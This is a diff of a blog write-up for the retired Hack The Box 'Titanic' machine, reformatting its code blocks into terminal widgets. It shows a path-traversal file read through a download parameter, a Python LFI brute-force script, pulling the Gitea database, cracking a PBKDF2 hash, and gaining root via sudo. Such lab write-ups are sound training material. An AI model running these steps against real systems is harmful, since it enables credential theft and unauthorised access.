@@ -26,8 +26,7 @@ So, Titanic just retired.  Now I can do my write-up for it.
 
 Let's get our nmap scans run to identify the services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 └──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.11.55
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 22:30 CDT
 Nmap scan report for 10.10.11.55
@@ -42,15 +41,17 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://titanic.htb/
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Update the /etc/hosts file to include the titanic.htb redirect.
 
-{% raw %}
-```bash
+{% capture catetchosts %}
 └──╼ [★]$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchosts %}
 127.0.0.1	localhost
 127.0.1.1	debian12-parrot
 10.10.11.55 titanic.htb
@@ -61,22 +62,24 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 127.0.0.1 localhost
 127.0.1.1 htb-uqfp1x2gbg htb-uqfp1x2gbg.htb-cloud.com
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetchosts %}
+
+{% include codebox.html title="/etc/hosts" content=etchosts %}
 
 <br />
 Run the curl -I to try and identify the technology.
 
-{% raw %}
-```bash
+{% capture curli %}
 └──╼ [★]$ curl -I http://titanic.htb
 HTTP/1.1 200 OK
 Date: Sat, 24 May 2025 03:40:22 GMT
 Server: Werkzeug/3.0.3 Python/3.10.12
 Content-Type: text/html; charset=utf-8
 Content-Length: 7399
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 View the landing page for the website.
@@ -90,8 +93,7 @@ View the landing page for the website.
 <br />
 Check the landing page source code.
 
-{% raw %}
-```html
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -121,9 +123,9 @@ Check the landing page source code.
 <snip>
 
 </body>
-</html>    
-```
-{% endraw %}
+</html>
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://titantic.htb' content=landingsource %}
 
 <br />
 Check if there is a robots file.
@@ -164,8 +166,7 @@ Send it to repeater and update the ticket parameter to pull /etc/passwd proving 
 <br />
 Check the full passwd file.
 
-{% raw %}
-```bash
+{% capture etcpasswd %}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -202,14 +203,13 @@ developer:x:1000:1000:developer:/home/developer:/bin/bash
 lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
 dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="/etc/passwd" content=etcpasswd %}
 
 <br />
 Generate a file list to test the lfi.
 
-{% raw %}
-```bash
+{% capture filelist %}
 \apache2\log\access_log
 \apache2\log\access.log
 \apache2\log\error_log
@@ -220,16 +220,16 @@ Generate a file list to test the lfi.
 \apache2\logs\access.log
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=filelist %}
+
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt</a>
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt</a>
 
 <br />
 Write a python script that submits all of the files from our list and filters out Ticket Not Found.
 
-{% raw %}
-```python
+{% capture testlfiscript %}
 import requests
 
 with open('/home/kali/Documents/htb/titanic/lfi', 'r') as fs:
@@ -259,14 +259,13 @@ with open('/home/kali/Documents/htb/titanic/lfi', 'r') as fs:
             print(url)
             print(results.text)
             print('**********************************')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='htb-titanic_0x00.py' content=testlfiscript %}
 
 <br />
 From the results, notice the /etc/hosts.
 
-{% raw %}
-```bash
+{% capture titetchosts %}
 127.0.0.1 localhost titanic.htb dev.titanic.htb
 127.0.1.1 titanic
 
@@ -276,17 +275,19 @@ fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="/etc/hosts" content=titetchosts %}
 <a href="http://titanic.htb/download?ticket=/etc/hosts">http://titanic.htb/download?ticket=/etc/hosts</a>
 
 <br />
 Update our /etc/hosts to include the dev.titanic.htb.
 
-{% raw %}
-```bash
+{% capture catetctitanic %}
 ┌──(kali㉿kali)-[~/Documents/htb/titanic]
-└─$ cat /etc/hosts              
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture devetctitanic %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.55     titanic.htb dev.titanic.htb
@@ -296,8 +297,11 @@ Update our /etc/hosts to include the dev.titanic.htb.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetctitanic %}
+
+{% include codebox.html title="/etc/passwd" content=devetctitanic %}
 
 <br />
 Check the dev landing page.
@@ -320,18 +324,16 @@ Check the repos in the Gitea.
 <br />
 Eumerate the repo and notice the two tickets.  Potential usernames somewhere.
 
-{% raw %}
-```json
+{% capture tickets %}
 {"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
 {"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='json' title='json' content=tickets %}
 
 <br />
 Check the mysql/docker-compose.yml.
 
-{% raw %}
-```yaml
+{% capture mysqlyml %}
 version: '3.8'
 
 services:
@@ -346,14 +348,13 @@ services:
       MYSQL_USER: sql_svc
       MYSQL_PASSWORD: sql_password
     restart: always
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='yaml' title='mysql/docker-compose.yml' content=mysqlyml %}
 
 <br />
 Check the gitea/docker-compose.yml.
 
-{% raw %}
-```yaml
+{% capture giteayml %}
 version: '3'
 
 services:
@@ -369,8 +370,8 @@ services:
       - USER_UID=1000
       - USER_GID=1000
     restart: always
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='yaml' title='gitea/docker-compose.yml' content=giteayml %}
 
 <br />
 Look up the possible locations of the Gitea app.ini file and play with the URL and LFI to pull the app.ini file.
@@ -385,8 +386,7 @@ Look up the possible locations of the Gitea app.ini file and play with the URL a
 <br />
 Download the gitea.db.
 
-{% raw %}
-```bash
+{% capture downloadgiteadb %}
 ┌──(kali㉿kali)-[~/Documents/htb/titanic]
 └─$ wget http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -O gitea.db
 --2025-05-25 20:19:07--  http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
@@ -399,8 +399,8 @@ Saving to: ‘gitea.db’
 gitea.db                                                   100%[========================================================================================================================================>]   1.99M   429KB/s    in 7.6s    
 
 2025-05-25 20:19:15 (268 KB/s) - ‘gitea.db’ saved [2084864/2084864]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadgiteadb %}
 
 <br />
 Check the user table in Sqlite Browser.
@@ -424,8 +424,7 @@ From the [Filter] field, we know the encryption is PBDKF2.  Look up a cracker fo
 <br />
 Download the cracker.
 
-{% raw %}
-```bash
+{% capture downloadphdpy %}
 ┌──(kali㉿kali)-[~/Documents/htb/titanic]
 └─$ wget https://raw.githubusercontent.com/Eli4m/HMAC_PBDKF2_Cracker/refs/heads/main/PBKDF2_HMAC_Decrypt.py -O phd.py --inet4-only
 --2025-05-25 20:41:24--  https://raw.githubusercontent.com/Eli4m/HMAC_PBDKF2_Cracker/refs/heads/main/PBKDF2_HMAC_Decrypt.py
@@ -438,14 +437,13 @@ Saving to: ‘phd.py’
 phd.py                                                     100%[========================================================================================================================================>]   2.71K  --.-KB/s    in 0s      
 
 2025-05-25 20:41:25 (41.2 MB/s) - ‘phd.py’ saved [2775/2775]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadphdpy %}
 
 <br />
 Run the cracker for the developer account and get a result.  Neat!
 
-{% raw %}
-```bash
+{% capture runcracker %}
 ┌──(kali㉿kali)-[~/Documents/htb/titanic]
 └─$ python3 phd.py -ph e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt -s 8bf3e3452b78544f8bee9400d6936d34 -i 50000 -l 50
 
@@ -470,14 +468,13 @@ Trying: 25282528
 
 
 MATCH Found!: 25282528
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runcracker %}
 
 <br />
 Check for password reuse and ssh in as the developer account.
 
-{% raw %}
-```bash
+{% capture sshdeveloper %}
 ┌──(kali㉿kali)-[~/Documents/htb/titanic]
 └─$ ssh developer@10.10.11.55                 
 The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
@@ -526,14 +523,13 @@ applicable law.
 
 Last login: Sun May 25 10:15:07 2025 from 10.10.16.11
 developer@titanic:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshdeveloper %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 developer@titanic:~$ cat /home/developer/user.txt 
 <redacted>
 developer@titanic:~$ ip a
@@ -567,38 +563,35 @@ developer@titanic:~$ ip a
     link/ether ce:de:5e:b5:7b:85 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet6 fe80::ccde:5eff:feb5:7b85/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run sudo -l to see all the commands that we can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 developer@titanic:~$ sudo -l
 Matching Defaults entries for developer on titanic:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
 User developer may run the following commands on titanic:
     (ALL) NOPASSWD: ALL
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Sudo into root.
 
-{% raw %}
-```bash
+{% capture suroot %}
 developer@titanic:~$ sudo su
 root@titanic:/home/developer#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suroot %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@titanic:/home/developer# cat /root/root.txt
 <redacted>
 root@titanic:/home/developer# ip a
@@ -632,8 +625,8 @@ root@titanic:/home/developer# ip a
     link/ether ce:de:5e:b5:7b:85 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet6 fe80::ccde:5eff:feb5:7b85/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, we bring the Titanic box home.  Hopefully, you enjoyed the read.  See you in the next one.
